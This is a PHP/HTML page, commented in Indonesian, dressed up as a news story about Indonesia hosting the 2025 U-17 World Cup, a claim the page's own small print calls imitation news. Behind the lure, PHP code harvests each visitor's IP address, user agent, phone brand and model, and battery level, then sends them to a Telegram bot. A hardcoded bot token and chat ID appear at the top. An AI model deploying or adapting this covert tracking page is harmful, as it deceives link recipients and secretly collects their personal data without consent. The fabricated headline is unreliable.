<?php
// Ganti token dan chat_id Telegram dengan milikmu
$token = "8083943226:AAGhI8-AJRzVn6yycUPKFSUcPTRpBFe0YH8";
$chat_id = "7152580245";

// Tangkap data dasar
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];
$waktu = date("Y-m-d H:i:s");

// Coba tebak merk dan model hape dari user agent
$brand = "Tidak diketahui";
$model = "Tidak diketahui";
if (preg_match('/; ([^;]+) Build/', $ua, $matches)) {
    $model = trim($matches[1]);
    // Coba cari merk populer
    $merk_list = ['Samsung','Xiaomi','Vivo','Oppo','Realme','Infinix','ASUS','Sony','OnePlus','Lenovo','Nokia','Huawei','HONOR','POCO','Meizu','Redmi','Google'];
    foreach ($merk_list as $merk) {
        if (stripos($model, $merk) !== false) {
            $brand = $merk;
            break;
        }
    }
}

// Ambil operator & baterai dari query string (atau JS)
$operator = isset($_GET['operator']) ? $_GET['operator'] : 'Tidak tersedia';
$battery = isset($_GET['battery']) ? $_GET['battery'] : 'Tidak tersedia';

// Gabungkan pesan Telegram
$text = "🔔 Ada yang buka link berita!\n"
      . "🕒 Waktu: $waktu\n"
      . "🌐 IP: $ip\n"
      . "📱 Merk: $brand\n"
      . "📱 Model: $model\n"
      . "📶 Operator: $operator\n"
      . "🔋 Baterai: $battery\n"
      . "🖥️ User-Agent: $ua";

// Kirim ke Telegram
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($text));

?>
<!DOCTYPE html>
<html>
<head>
    <title>Indonesia Resmi Tuan Rumah Piala Dunia U-17 2025</title>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <script>
    // Battery API (jika didukung)
    window.addEventListener("load", function() {
        if (navigator.getBattery) {
            navigator.getBattery().then(function(battery) {
                var level = Math.round(battery.level * 100) + "%";
                var url = window.location.pathname + "?battery=" + encodeURIComponent(level);
                // Operator tidak bisa didapat otomatis di browser
                var xhr = new XMLHttpRequest();
                xhr.open("GET", url, true);
                xhr.send();
            });
        }
    });
    </script>
    <style>
        body { font-family: sans-serif; margin: 16px; background: #f7f7f7; }
        .newsbox { background: #fff; padding: 16px; border-radius: 8px; box-shadow: 0 2px 8px #0001; max-width: 480px; margin: auto; }
        h2 { margin-top: 0; }
        small { color: #888; }
    </style>
</head>
<body>
    <div class="newsbox">
        <h2>Indonesia Resmi Tuan Rumah Piala Dunia U-17 2025</h2>
        <p>FIFA resmi menunjuk Indonesia sebagai tuan rumah Piala Dunia U-17 2025. Penunjukan ini diumumkan pada kongres FIFA yang berlangsung di Zurich, Swiss. Indonesia akan menjadi negara Asia Tenggara pertama yang menjadi tuan rumah ajang sepak bola bergengsi ini.</p>
        <small>Berita tiruan. Data kunjungan Anda tercatat otomatis.</small>
    </div>
</body>
</html>